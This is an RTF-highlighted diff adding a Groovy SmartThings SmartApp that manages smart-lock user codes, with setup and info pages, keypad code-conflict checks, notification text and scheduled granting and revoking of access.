+      {\cf10\b if} {\cf8 (}hhPhrases{\cf8 )} {\cf8 \{}\par
+        hhPhrases{\cf8 .}{\cf21 sort}{\cf8 (}{\cf8 )}\par
+        input {\cf24 name:} {\cf2 "calStartPhrase"}{\cf8 ,} {\cf24 type:} {\cf2 "enum"}{\cf8 ,} {\cf24 title:} {\cf2 "Hello Home Phrase"}{\cf8 ,} {\cf24 multiple:} {\cf10\b true}{\cf8 ,}{\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 options:} hhPhrases{\cf8 ,} {\cf24 refreshAfterSelection:} {\cf10\b true}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+    section{\cf8 (}{\cf2 "End Date"}{\cf8 )} {\cf8 \{}\par
+      input {\cf24 name:} {\cf2 "endDay"}{\cf8 ,} {\cf24 type:} {\cf2 "number"}{\cf8 ,} {\cf24 title:} {\cf2 "Day"}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+      input {\cf24 name:} {\cf2 "endMonth"}{\cf8 ,} {\cf24 type:} {\cf2 "number"}{\cf8 ,} {\cf24 title:} {\cf2 "Month"}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+      input {\cf24 name:} {\cf2 "endYear"}{\cf8 ,} {\cf24 type:} {\cf2 "number"}{\cf8 ,} {\cf24 description:} {\cf2 "Format(yyyy)"}{\cf8 ,} {\cf24 title:} {\cf2 "Year"}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+      input {\cf24 name:} {\cf2 "endTime"}{\cf8 ,} {\cf24 type:} {\cf2 "time"}{\cf8 ,} {\cf24 title:} {\cf2 "End Time"}{\cf8 ,} {\cf24 description:} {\cf10\b null}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+      {\cf10\b if} {\cf8 (}hhPhrases{\cf8 )} {\cf8 \{}\par
+        hhPhrases{\cf8 .}{\cf21 sort}{\cf8 (}{\cf8 )}\par
+        input {\cf24 name:} {\cf2 "calEndPhrase"}{\cf8 ,} {\cf24 type:} {\cf2 "enum"}{\cf8 ,} {\cf24 title:} {\cf2 "Hello Home Phrase"}{\cf8 ,} {\cf24 multiple:} {\cf10\b true}{\cf8 ,}{\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 options:} hhPhrases{\cf8 ,} {\cf24 refreshAfterSelection:} {\cf10\b true}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 onUnlockPage}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  dynamicPage{\cf8 (}{\cf24 name:}{\cf2 "onUnlockPage"}{\cf8 ,} {\cf24 title:}{\cf2 "Global Actions (Any Code)"}{\cf8 )} {\cf8 \{}\par
+    section{\cf8 (}{\cf2 "Actions"}{\cf8 )} {\cf8 \{}\par
+      {\cf20 def} hhPhrases {\cf8 =} location{\cf8 .}{\cf21 getHelloHome}{\cf8 (}{\cf8 )}{\cf8 ?}{\cf8 .}{\cf21 getPhrases}{\cf8 (}{\cf8 )}{\cf8 *}{\cf8 .}{\cf21 label}\par
+      {\cf10\b if} {\cf8 (}hhPhrases{\cf8 )} {\cf8 \{}\par
+        hhPhrases{\cf8 .}{\cf21 sort}{\cf8 (}{\cf8 )}\par
+        input {\cf24 name:} {\cf2 "homePhrases"}{\cf8 ,} {\cf24 type:} {\cf2 "enum"}{\cf8 ,} {\cf24 title:} {\cf2 "Home Mode Phrase"}{\cf8 ,} {\cf24 multiple:} {\cf10\b true}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 options:} hhPhrases{\cf8 ,} {\cf24 refreshAfterSelection:} {\cf10\b true}{\cf8 ,} {\cf24 submitOnChange:} {\cf10\b true}\par
+        {\cf10\b if} {\cf8 (}homePhrases{\cf8 )} {\cf8 \{}\par
+          input {\cf2 "noRunPresence"}{\cf8 ,} {\cf2 "capability.presenceSensor"}{\cf8 ,} {\cf24 title:} {\cf2 "Don't run Actions if any of these are present:"}{\cf8 ,} {\cf24 multiple:} {\cf10\b true}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+          input {\cf2 "doRunPresence"}{\cf8 ,} {\cf2 "capability.presenceSensor"}{\cf8 ,} {\cf24 title:} {\cf2 "Run Actions only if any of these are present:"}{\cf8 ,} {\cf24 multiple:} {\cf10\b true}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+          input {\cf24 name:} {\cf2 "manualUnlock"}{\cf8 ,} {\cf24 title:} {\cf2 "Initiate phrase on manual unlock also?"}{\cf8 ,} {\cf24 type:} {\cf2 "bool"}{\cf8 ,} {\cf24 defaultValue:} {\cf10\b false}{\cf8 ,} {\cf24 refreshAfterSelection:} {\cf10\b true}\par
+          input{\cf8 (}{\cf24 name:} {\cf2 "modeIgnore"}{\cf8 ,} {\cf24 title:} {\cf2 "Do not run Routine when in this mode"}{\cf8 ,} {\cf24 type:} {\cf2 "mode"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 mutliple:} {\cf10\b false}{\cf8 )}\par
+        {\cf8 \}}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 resetCodeUsagePage}{\cf8 (}params{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} i {\cf8 =} getUser{\cf8 (}params{\cf8 )}\par
+  {\cf1\i // do reset\par
+}  resetCodeUsage{\cf8 (}i{\cf8 )}\par
+\par
+  dynamicPage{\cf8 (}{\cf24 name:}{\cf2 "resetCodeUsagePage"}{\cf8 ,} {\cf24 title:}{\cf2 "User Usage Reset"}{\cf8 )} {\cf8 \{}\par
+    section {\cf8 \{}\par
+      paragraph {\cf2 "User code usage has been reset."}\par
+    {\cf8 \}}\par
+    section {\cf8 \{}\par
+      href{\cf8 (}{\cf24 name:} {\cf2 "toSetupPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Back To Users"}{\cf8 ,} {\cf24 page:} {\cf2 "setupPage"}{\cf8 )}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 resetAllCodeUsagePage}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf1\i // do resetAll\par
+}  resetAllCodeUsage{\cf8 (}{\cf8 )}\par
+  dynamicPage{\cf8 (}{\cf24 name:}{\cf2 "resetAllCodeUsagePage"}{\cf8 ,} {\cf24 title:}{\cf2 "User Settings"}{\cf8 )} {\cf8 \{}\par
+    section {\cf8 \{}\par
+      paragraph {\cf2 "All user code usages have been reset."}\par
+    {\cf8 \}}\par
+    section{\cf8 (}{\cf2 "Users"}{\cf8 )} {\cf8 \{}\par
+      href{\cf8 (}{\cf24 name:} {\cf2 "toSetupPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Back to Users"}{\cf8 ,} {\cf24 page:} {\cf2 "setupPage"}{\cf8 )}\par
+      href{\cf8 (}{\cf24 name:} {\cf2 "toRootPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Main Page"}{\cf8 ,} {\cf24 page:} {\cf2 "rootPage"}{\cf8 )}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 reEnableUserPage}{\cf8 (}params{\cf8 )} {\cf8 \{}\par
+  {\cf1\i // do reset\par
+}  {\cf20 def} i {\cf8 =} getUser{\cf8 (}params{\cf8 )}\par
+  enableUser{\cf8 (}i{\cf8 )}\par
+  lockErrorLoopReset{\cf8 (}{\cf8 )}\par
+  dynamicPage{\cf8 (}{\cf24 name:}{\cf2 "reEnableUserPage"}{\cf8 ,} {\cf24 title:}{\cf2 "User re-enabled"}{\cf8 )} {\cf8 \{}\par
+    section {\cf8 \{}\par
+      paragraph {\cf2 "User has been enabled."}\par
+    {\cf8 \}}\par
+    section {\cf8 \{}\par
+      href{\cf8 (}{\cf24 name:} {\cf2 "toSetupPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Back To Users"}{\cf8 ,} {\cf24 page:} {\cf2 "setupPage"}{\cf8 )}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 getUser}{\cf8 (}params{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} i {\cf8 =} {\cf8 1}\par
+  {\cf1\i // Assign params to i.  Sometimes parameters are double nested.\par
+}  {\cf10\b if} {\cf8 (}params{\cf8 .}{\cf21 number}{\cf8 )} {\cf8 \{}\par
+    i {\cf8 =} params{\cf8 .}{\cf21 number}\par
+  {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}params{\cf8 .}{\cf21 params}{\cf8 )}{\cf8 \{}\par
+    i {\cf8 =} params{\cf8 .}{\cf21 params}{\cf8 .}{\cf21 number}\par
+  {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}state{\cf8 .}{\cf21 lastUser}{\cf8 )} {\cf8 \{}\par
+    i {\cf8 =} state{\cf8 .}{\cf21 lastUser}\par
+  {\cf8 \}}\par
+\par
+  {\cf1\i //Make sure i is a round number, not a float.\par
+}  {\cf10\b if} {\cf8 (} {\cf8 !} i{\cf8 .}{\cf21 isNumber}{\cf8 (}{\cf8 )} {\cf8 )} {\cf8 \{}\par
+    i {\cf8 =} i{\cf8 .}{\cf21 toInteger}{\cf8 (}{\cf8 )}{\cf8 ;}\par
+  {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (} i{\cf8 .}{\cf21 isNumber}{\cf8 (}{\cf8 )} {\cf8 )} {\cf8 \{}\par
+    i {\cf8 =} Math{\cf8 .}{\cf21 round}{\cf8 (}i {\cf8 *} {\cf8 100}{\cf8 )} {\cf2 / 100\par
+  \}\par
+  state.lastUser = i\par
+  return i\par
+\}\par
+\par
+def getLock(params) \{\par
+  def id = ''\par
+  /}{\cf2 / Assign params to id.  Sometimes parameters are double nested.\par
+  if (params.id) \{\par
+    id = params.id\par
+  \} else if (params.params)\{\par
+    id = params.params.id\par
+  \} else if (state.lastLock) \{\par
+    id = state.lastLock\par
+  \}\par
+\par
+  state.lastLock = id\par
+  return theLocks.find\{it.id == id\}\par
+\}\par
+\par
+def infoPage() \{\par
+  dynamicPage(name:"infoPage", title:"Lock Info") \{\par
+    section() \{\par
+      href(name: "toInfoRefreshPage", page: "infoRefreshPage", title: "Refresh Lock Data", description: 'Tap to refresh')\par
+    \}\par
+    section("Locks") \{\par
+      if (theLocks) \{\par
+        def i = 0\par
+        theLocks.each \{ lock->\par
+          i++\par
+          href(name: "toLockInfoPage$\{i\}", page: "lockInfoPage", params: [id: lock.id], required: false, title: lock.displayName )\par
+        \}\par
+      \}\par
+    \}\par
+  \}\par
+\}\par
+\par
+def infoRefreshPage() \{\par
+  dynamicPage(name:"infoRefreshPage", title:"Lock Info") \{\par
+    section() \{\par
+      manualPoll()\par
+      paragraph "Lock info refreshing soon."\par
+      href(name: "toInfoPage", page: "infoPage", title: "Back to Lock Info")\par
+    \}\par
+  \}\par
+\}\par
+\par
+def lockInfoPage(params) \{\par
+  dynamicPage(name:"lockInfoPage", title:"Lock Info") \{\par
+\par
+    def lock = getLock(params)\par
+    if (lock) \{\par
+      section("$\{lock.displayName\}") \{\par
+        if (state."lock$\{lock.id\}".codes != null) \{\par
+          def i = 0\par
+          def pass = ''\par
+          state."lock$\{lock.id\}".codes.each \{ code->\par
+            i++\par
+            pass = state."lock$\{lock.id\}".codes."slot$\{i\}"\par
+            paragraph "Slot $\{i\}\\nCode: $\{pass\}"\par
+          \}\par
+        \} else \{\par
+          paragraph "No Lock data received yet.  Requires custom device driver.  Will be populated on next poll event."\par
+        \}\par
+      \}\par
+    \}\par
+  \}\par
+\}\par
+\par
+\par
+def keypadPage() \{\par
+  dynamicPage(name: "keypadPage",title: "Keypad Settings (optional)") \{\par
+    section("Settings") \{\par
+      /}{\cf2 / TODO: put inputs here\par
+      input(name: "keypad", title: "Keypad", type: "capability.lockCodes", multiple: true, required: false)\par
+    \}\par
+    def hhPhrases = location.getHelloHome()?.getPhrases()*.label\par
+    hhPhrases?.sort()\par
+    section("Routines", hideable: true, hidden: true) \{\par
+      input(name: "armRoutine", title: "Arm/}Away routine{\cf2 ", type: "}{\cf10\b enum}{\cf2 ", options: hhPhrases, required: false)\par
+      input(name: "}disarmRoutine{\cf2 ", title: "}Disarm routine{\cf2 ", type: "}{\cf10\b enum}{\cf2 ", options: hhPhrases, required: false)\par
+      input(name: "}stayRoutine{\cf2 ", title: "}Arm{\cf2 /Stay routine", type: "enum", options: hhPhrases, required: false)\par
+      input(name: "nightRoutine", title: "Arm/}Night routine{\cf2 ", type: "}{\cf10\b enum}{\cf2 ", options: hhPhrases, required: false)\par
+      input(name: "}armDelay{\cf2 ", title: "}Arm Delay {\cf8 (}{\cf10\b in} seconds{\cf8 )}{\cf2 ", type: "}number{\cf2 ", required: false)\par
+      input(name: "}notifyIncorrectPin{\cf2 ", title: "}Notify you when incorrect code is used{\cf8 ?}{\cf2 ", type: "}bool{\cf2 ", required: false)\par
+    \}\par
+  \}\par
+\}\par
+\par
+public smartThingsDateFormat() \{ "}yyyy{\cf8 -}MM{\cf8 -}dd{\cf2 'T'}{\cf24 HH:}{\cf24 mm:}ss{\cf8 .}{\cf21 SSSZ}{\cf2 " \}\par
+\par
+public humanReadableStartDate() \{\par
+  new Date().parse(smartThingsDateFormat(), startTime).format("}{\cf24 h:}mm a{\cf2 ", timeZone(startTime))\par
+\}\par
+public humanReadableEndDate() \{\par
+  new Date().parse(smartThingsDateFormat(), endTime).format("}{\cf24 h:}mm a{\cf2 ", timeZone(endTime))\par
+\}\par
+\par
+def manualPoll() \{\par
+  theLocks.poll()\par
+\}\par
+\par
+def getConflicts(i) \{\par
+  def currentCode = settings."}userCode${\cf8 \{}i{\cf8 \}}{\cf2 "\par
+  def currentSlot = settings."}userSlot${\cf8 \{}i{\cf8 \}}{\cf2 "\par
+  def conflict = [:]\par
+  conflict.has_conflict = false\par
+\par
+\par
+  theLocks.each \{ lock->\par
+    if (state."}lock${\cf8 \{}lock{\cf8 .}{\cf21 id}{\cf8 \}}{\cf2 ".codes) \{\par
+      conflict."}lock${\cf8 \{}lock{\cf8 .}{\cf21 id}{\cf8 \}}{\cf2 " = [:]\par
+      conflict."}lock${\cf8 \{}lock{\cf8 .}{\cf21 id}{\cf8 \}}{\cf2 ".conflicts = []\par
+      def ind = 0\par
+      state."}lock${\cf8 \{}lock{\cf8 .}{\cf21 id}{\cf8 \}}{\cf2 ".codes.each \{ code ->\par
+        ind++\par
+        if (currentSlot?.toInteger() != ind.toInteger() && !isUnique(currentCode, state."}lock${\cf8 \{}lock{\cf8 .}{\cf21 id}{\cf8 \}}{\cf2 ".codes."}slot${\cf8 \{}ind{\cf8 \}}{\cf2 ")) \{\par
+          conflict.has_conflict = true\par
+          state."}userState${\cf8 \{}i{\cf8 \}}{\cf2 ".enabled = false\par
+          state."}userState${\cf8 \{}i{\cf8 \}}{\cf2 ".disabledReason = "}Code Conflict Detected{\cf2 "\par
+          conflict."}lock${\cf8 \{}lock{\cf8 .}{\cf21 id}{\cf8 \}}{\cf2 ".conflicts << ind\par
+        \}\par
+      \}\par
+    \}\par
+  \}\par
+\par
+  return conflict\par
+\}\par
+\par
+def isUnique(newInt, oldInt) \{\par
+\par
+  if (newInt == null || oldInt == null) \{\par
+    // if either number is null, break here.\par
+    return true\par
+  \}\par
+\par
+  if (!newInt.isInteger() || !oldInt.isInteger()) \{\par
+    // number is not an integer, can't check.\par
+    return true\par
+  \}\par
+\par
+  def newArray = []\par
+  def oldArray = []\par
+  def result = true\par
+\par
+  def i = 0\par
+  // Get a normalized sequence, at the same length\par
+  newInt.toString().toList().collect \{\par
+    i++\par
+    if (i <= oldInt.length()) \{\par
+      newArray << normalizeNumber(it.toInteger())\par
+    \}\par
+  \}\par
+\par
+  i = 0\par
+  oldInt.toString().toList().collect \{\par
+    i++\par
+    if (i <= oldInt.length()) \{\par
+      oldArray << normalizeNumber(it.toInteger())\par
+    \}\par
+  \}\par
+\par
+  i = 0\par
+  newArray.each \{ num->\par
+    i++\par
+    if (newArray.join() == oldArray.join()) \{\par
+      // The normalized numbers are the same!\par
+      result = false\par
+    \}\par
+  \}\par
+  return result\par
+\}\par
+\par
+def normalizeNumber(number) \{\par
+  def result = null\par
+  // RULE: Since some locks share buttons, make sure unique.\par
+  // Even locks with 10-keys follow this rule! (annoyingly)\par
+  switch (number) \{\par
+    case [1,2]:\par
+      result = 1\par
+      break\par
+    case [3,4]:\par
+      result = 2\par
+      break\par
+    case [5,6]:\par
+      result = 3\par
+      break\par
+    case [7,8]:\par
+      result = 4\par
+      break\par
+    case [9,0]:\par
+      result = 5\par
+      break\par
+  \}\par
+  return result\par
+\}\par
+\par
+def setupPageDescription()\{\par
+  def parts = []\par
+  for (int i = 1; i <= settings.maxUsers; i++) \{\par
+    parts << settings."}userName${\cf8 \{}i{\cf8 \}}{\cf2 "\par
+  \}\par
+  return fancyString(parts)\par
+\}\par
+\par
+def notificationPageDescription() \{\par
+  def parts = []\par
+  def msg = "}{\cf2 "\par
+  if (settings.phone) \{\par
+    parts << "}SMS to ${\cf8 \{}phone{\cf8 \}}{\cf2 "\par
+  \}\par
+  if (settings.sendevent) \{\par
+    parts << "}Event Notification{\cf2 "\par
+  \}\par
+  if (settings.notification) \{\par
+    parts << "}Push Notification{\cf2 "\par
+  \}\par
+  msg += fancyString(parts)\par
+  parts = []\par
+\par
+  if (settings.notifyAccess) \{\par
+    parts << "}on entry{\cf2 "\par
+  \}\par
+  if (settings.notifyLock) \{\par
+    parts << "}on lock{\cf2 "\par
+  \}\par
+  if (settings.notifyUnlock) \{\par
+    parts << "}on unlock{\cf2 "\par
+  \}\par
+  if (settings.notifyAccessStart) \{\par
+    parts << "}when granting access{\cf2 "\par
+  \}\par
+  if (settings.notifyAccessEnd) \{\par
+    parts << "}when revoking access{\cf2 "\par
+  \}\par
+  if (settings.notificationStartTime) \{\par
+    parts << "}starting at ${\cf8 \{}settings{\cf8 .}{\cf21 notificationStartTime}{\cf8 \}}{\cf2 "\par
+  \}\par
+  if (settings.notificationEndTime) \{\par
+    parts << "}ending at ${\cf8 \{}settings{\cf8 .}{\cf21 notificationEndTime}{\cf8 \}}{\cf2 "\par
+  \}\par
+  if (parts.size()) \{\par
+    msg += "}{\cf8 :} {\cf2 "\par
+    msg += fancyString(parts)\par
+  \}\par
+  return msg\par
+\}\par
+\par
+def calendarHrefDescription() \{\par
+  def dateStart = startDateTime()\par
+  def dateEnd = endDateTime()\par
+  if (dateEnd && dateStart) \{\par
+    def startReadableTime = readableDateTime(dateStart)\par
+    def endReadableTime = readableDateTime(dateEnd)\par
+    return "}Accessible from ${\cf8 \{}startReadableTime{\cf8 \}} until ${\cf8 \{}endReadableTime{\cf8 \}}{\cf2 "\par
+  \} else if (!dateEnd && dateStart) \{\par
+    def startReadableTime = readableDateTime(dateStart)\par
+    return "}Accessible on ${\cf8 \{}startReadableTime{\cf8 \}}{\cf2 "\par
+  \} else if (dateEnd && !dateStart)\{\par
+    def endReadableTime = readableDateTime(dateEnd)\par
+    return "}Accessible until ${\cf8 \{}endReadableTime{\cf8 \}}{\cf2 "\par
+  \}\par
+\}\par
+\par
+def readableDateTime(date) \{\par
+  new Date().parse(smartThingsDateFormat(), date.format(smartThingsDateFormat(), location.timeZone)).format("}EEE{\cf8 ,} MMM d yyyy {\cf2 'at'} {\cf24 h:}mma{\cf2 ", location.timeZone)\par
+\}\par
+\par
+def userHrefTitle(i) \{\par
+  def title = "}User ${\cf8 \{}i{\cf8 \}}{\cf2 "\par
+  if (settings."}userName${\cf8 \{}i{\cf8 \}}{\cf2 ") \{\par
+    title = settings."}userName${\cf8 \{}i{\cf8 \}}{\cf2 "\par
+  \}\par
+  return title\par
+\}\par
+\par
+def userHrefDescription(i) \{\par
+  def uc = settings."}userCode${\cf8 \{}i{\cf8 \}}{\cf2 "\par
+  def us = settings."}userSlot${\cf8 \{}i{\cf8 \}}{\cf2 "\par
+  def usage = state."}userState${\cf8 \{}i{\cf8 \}}{\cf2 ".usage\par
+  def description = "}{\cf2 "\par
+  if (us != null) \{\par
+    description += "}{\cf24 Slot:} ${\cf8 \{}us{\cf8 \}}{\cf2 "\par
+  \}\par
+  if (uc != null) \{\par
+    description += "} {\cf2 / $\{uc\}"\par
+    if(settings."burnCode$\{i\}") \{\par
+      description += ' [Single Use]'\par
+    \}\par
+  \}\par
+  if (usage != null) \{\par
+    description += " [Usage: $\{usage\}]"\par
+  \}\par
+  return description\par
+\}\par
+\par
+def userPageState(i) \{\par
+  if (settings."userCode$\{i\}" && userIsEnabled(i)) \{\par
+    if (settings."burnCode$\{i\}") \{\par
+      if (state."userState$\{i\}".usage > 0) \{\par
+        return 'incomplete'\par
+      \} else \{\par
+        return 'complete'\par
+      \}\par
+    \} else \{\par
+      return 'complete'\par
+    \}\par
+\par
+  \} else if (settings."userCode$\{i\}" && !settings."userEnabled$\{i\}") \{\par
+    return 'incomplete'\par
+  \} else \{\par
+    return 'incomplete'\par
+  \}\par
+\}\par
+\par
+def userIsEnabled(i) \{\par
+  if (settings."userEnabled$\{i\}" && (settings."userCode$\{i\}" != null) && (state."userState$\{i\}".enabled != false)) \{\par
+    return true\par
+  \} else \{\par
+    return false\par
+  \}\par
+\}\par
+\par
+def fancyDeviceString(devices = []) \{\par
+  fancyString(devices.collect \{ deviceLabel(it) \})\par
+\}\par
+\par
+def deviceLabel(device) \{\par
+  return device.label ?: device.name\par
+\}\par
+\par
+def fancyString(listOfStrings) \{\par
+  listOfStrings.removeAll([null])\par
+  def fancify = \{ list ->\par
+    return list.collect \{\par
+      def label = it\par
+      if (list.size() > 1 && it == list[-1]) \{\par
+        label = "and $\{label\}"\par
+      \}\par
+      label\par
+    \}.join(", ")\par
+  \}\par
+\par
+  return fancify(listOfStrings)\par
+\}\par
+\par
+def schedulingHrefDescription() \{\par
+  if (startDateTime() || endDateTime()) \{\par
+    calendarHrefDescription()\par
+  \} else \{\par
+    def descriptionParts = []\par
+    if (days) \{\par
+      descriptionParts << "On $\{fancyString(days)\},"\par
+    \}\par
+\par
+    descriptionParts << "$\{fancyDeviceString(theLocks)\} will be accessible"\par
+    if ((andOrTime != null) || (modeStart == null)) \{\par
+      if (startTime) \{\par
+        descriptionParts << "at $\{humanReadableStartDate()\}"\par
+      \}\par
+      if (endTime) \{\par
+        descriptionParts << "until $\{humanReadableEndDate()\}"\par
+      \}\par
+    \}\par
+\par
+    if (modeStart) \{\par
+      if (startTime && andOrTime) \{\par
+        descriptionParts << andOrTime\par
+      \}\par
+      descriptionParts << "when $\{location.name\} enters '$\{modeStart\}' mode"\par
+    \}\par
+\par
+    if (descriptionParts.size() <= 1) \{\par
+      /}{\cf2 / locks will be in the list no matter what. No rules are set if only locks are in the list\par
+      return null\par
+    \}\par
+    return descriptionParts.join(" ")\par
+  \}\par
+\}\par
+\par
+def installed() \{\par
+  log.debug "Installing 'Locks' with settings: $\{settings\}"\par
+  initialize()\par
+\}\par
+\par
+def updated() \{\par
+  log.debug "Updating 'Locks' with settings: $\{settings\}"\par
+  initialize()\par
+\}\par
+\par
+private initialize() \{\par
+  unsubscribe()\par
+  unschedule()\par
+  if (startTime && !startDateTime()) \{\par
+    log.debug "scheduling access routine to run at $\{startTime\}"\par
+    schedule(startTime, "reconcileCodesStart")\par
+  \} else if (startDateTime()) \{\par
+    /}{\cf2 / There's a start date, so let's run then\par
+    log.debug "scheduling RUNONCE start"\par
+    runOnce(startDateTime().format(smartThingsDateFormat(), location.timeZone), "reconcileCodesStart")\par
+  \}\par
+\par
+  if (endTime && !endDateTime()) \{\par
+    log.debug "scheduling access denial routine to run at $\{endTime\}"\par
+    schedule(endTime, "reconcileCodesEnd")\par
+  \} else if (endDateTime()) \{\par
+    /}{\cf2 / There's a end date, so let's run then\par
+    log.debug "scheduling RUNONCE end"\par
+    runOnce(endDateTime().format(smartThingsDateFormat(), location.timeZone), "reconcileCodesEnd")\par
+  \}\par
+\par
+  subscribe(location, locationHandler)\par
+\par
+  subscribe(theLocks, "codeReport", codereturn)\par
+  subscribe(theLocks, "lock", codeUsed)\par
+  subscribe(theLocks, "reportAllCodes", pollCodeReport, [filterEvents:false])\par
+  if (keypad) \{\par
+    subscribe(location,"alarmSystemStatus",alarmStatusHandler)\par
+    subscribe(keypad,"codeEntered",codeEntryHandler)\par
+  \}\par
+\par
+  revokeDisabledUsers()\par
+  reconcileCodes()\par
+  lockErrorLoopReset()\par
+  initalizeLockData()\par
+\par
+  log.debug "state: $\{state\}"\par
+\}\par
+\par
+def resetAllCodeUsage() \{\par
+  for (int i = 1; i <= settings.maxUsers; i++) \{\par
+    lockErrorLoopReset()\par
+    resetCodeUsage(i)\par
+  \}\par
+  log.debug "reseting all code usage"\par
+\}\par
+\par
+def resetCodeUsage(i) \{\par
+  if(state."userState$\{i\}" == null) \{\par
+    state."userState$\{i\}" = [:]\par
+    state."userState$\{i\}".enabled = true\par
+  \}\par
+  state."userState$\{i\}".usage = 0\par
+\}\par
+\par
+def enableUser(i) \{\par
+  state."userState$\{i\}".enabled = true\par
+\}\par
+\par
+def initalizeLockData() \{\par
+  theLocks.each \{ lock->\par
+    if (state."lock$\{lock.id\}" == null) \{\par
+      state."lock$\{lock.id\}" = [:]\par
+    \}\par
+  \}\par
+\}\par
+\par
+def lockErrorLoopReset() \{\par
+  state.error_loop_count = 0\par
+  theLocks.each \{ lock->\par
+    if (state."lock$\{lock.id\}" == null) \{\par
+      state."lock$\{lock.id\}" = [:]\par
+    \}\par
+    state."lock$\{lock.id\}".error_loop = false\par
+  \}\par
+\}\par
+\par
+\par
+def locationHandler(evt) \{\par
+  log.debug "locationHandler evt: $\{evt.value\}"\par
+  if (modeStart) \{\par
+    reconcileCodes()\par
+  \}\par
+\}\par
+\par
+def reconcileCodes() \{\par
+  if (isAbleToStart()) \{\par
+    grantAccess()\par
+  \} else \{\par
+    revokeAccess()\par
+  \}\par
+\}\par
+\par
+def reconcileCodesStart() \{\par
+  /}{\cf2 / schedule start of reconcileCodes\par
+  reconcileCodes()\par
+  if (calStartPhrase) \{\par
+    location.helloHome.execute(calStartPhrase)\par
+  \}\par
+\}\par
+\par
+def reconcileCodesEnd() \{\par
+  /}{\cf2 / schedule end of reconcileCodes\par
+  reconcileCodes()\par
+  if (calEndPhrase) \{\par
+    location.helloHome.execute(calEndPhrase)\par
+  \}\par
+\}\par
+\par
+def isAbleToStart() \{\par
+  def dateStart = startDateTime()\par
+  def dateEnd = endDateTime()\par
+\par
+  if (dateStart || dateEnd) \{\par
+    /}{\cf2 / calendar schedule above all\par
+    return checkCalendarSchedule(dateStart, dateEnd)\par
+  \} else if (modeStart || startTime || endTime || days) \{\par
+    /}{\cf2 / No calendar set, check daily schedule\par
+    if (isCorrectDay()) \{\par
+      /}{\cf2 / it's the right day\par
+      checkDailySchedule()\par
+    \} else \{\par
+      /}{\cf2 / it's the wrong day\par
+      return false\par
+    \}\par
+  \} else \{\par
+    /}{\cf2 / no schedule\par
+    return true\par
+  \}\par
+\}\par
+\par
+def checkDailySchedule() \{\par
+  if (andOrTime && modeStart && (isCorrectMode() || isInScheduledTime())) \{\par
+    /}{\cf2 / in correct mode or time with and/}or {\cf10\b switch}\par
+    {\cf10\b if} {\cf8 (}andOrTime {\cf8 =}{\cf8 =} {\cf2 'and'}{\cf8 )} {\cf8 \{}\par
+      {\cf1\i // must be both\par
+}      {\cf10\b if} {\cf8 (}isCorrectMode{\cf8 (}{\cf8 )} {\cf8 &}{\cf8 &} isInScheduledTime{\cf8 (}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+        {\cf1\i // is both\par
+}        {\cf10\b return} {\cf10\b true}\par
+      {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+        {\cf1\i // is not both\par
+}        {\cf10\b return} {\cf10\b false}\par
+      {\cf8 \}}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      {\cf1\i // could be either\par
+}      {\cf10\b if} {\cf8 (}isCorrectMode{\cf8 (}{\cf8 )} {\cf8 |}{\cf8 |} isInScheduledTime{\cf8 (}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+        {\cf1\i // it is either mode or time\par
+}        {\cf10\b return} {\cf10\b true}\par
+      {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+        {\cf1\i // is not either mode or time\par
+}        {\cf10\b return} {\cf10\b false}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    {\cf1\i // Allow either mode or time, no andOrTime is set\par
+}    {\cf10\b if} {\cf8 (}isCorrectMode{\cf8 (}{\cf8 )} {\cf8 |}{\cf8 |} isInScheduledTime{\cf8 (}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+      {\cf1\i // it is either mode or time\par
+}      {\cf10\b return} {\cf10\b true}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      {\cf1\i // is not either mode or time\par
+}      {\cf10\b return} {\cf10\b false}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 checkCalendarSchedule}{\cf8 (}dateStart{\cf8 ,} dateEnd{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} now {\cf8 =} rightNow{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 getTime}{\cf8 (}{\cf8 )}\par
+  {\cf10\b if} {\cf8 (}dateStart {\cf8 &}{\cf8 &} {\cf8 !}dateEnd{\cf8 )} {\cf8 \{}\par
